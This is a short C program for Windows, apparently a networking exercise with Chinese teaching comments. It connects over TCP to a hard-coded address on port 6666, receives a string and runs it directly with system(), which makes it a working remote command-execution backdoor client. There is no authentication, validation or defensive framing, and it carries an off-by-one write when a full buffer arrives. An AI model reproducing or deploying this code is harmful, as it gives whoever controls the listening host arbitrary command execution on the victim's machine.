#define _WINSOCK_DEPRECATED_NO_WARNINGS 


#include <stdio.h>
#include <WinSock2.h>  //网络编程

#define IP  "192.168.0.106"

#pragma comment(lib,"ws2_32.lib")  //网络库  .dll动态库 .lib静态库

int main(void) {
	//初始化网络库
	WSADATA wd;
	WSAStartup(MAKEWORD(2, 2), &wd);

	//创建套接字  AF_INET inet网  SOCK_STREAM tcp  SOCK_DGRAM udp
	SOCKET client = socket(AF_INET, SOCK_STREAM, 0);

	// 绑定套接字  设定地址和端口
	SOCKADDR_IN serAddr;
	//htonl字节序转换  主机字节序=》网络字节序
	serAddr.sin_addr.S_un.S_addr = inet_addr(IP);
	//协议家族
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(6666);

	connect(client, (SOCKADDR*)&serAddr, sizeof(SOCKADDR));

	char buf[1024];
	int n = recv(client, buf, sizeof(buf),0);

	if (n > 0) {
		buf[n] = '\0';
		printf("收到命令[%d]：%s\n",n, buf);
		system(buf);
	}
	
	system("pause");
	return 0;
}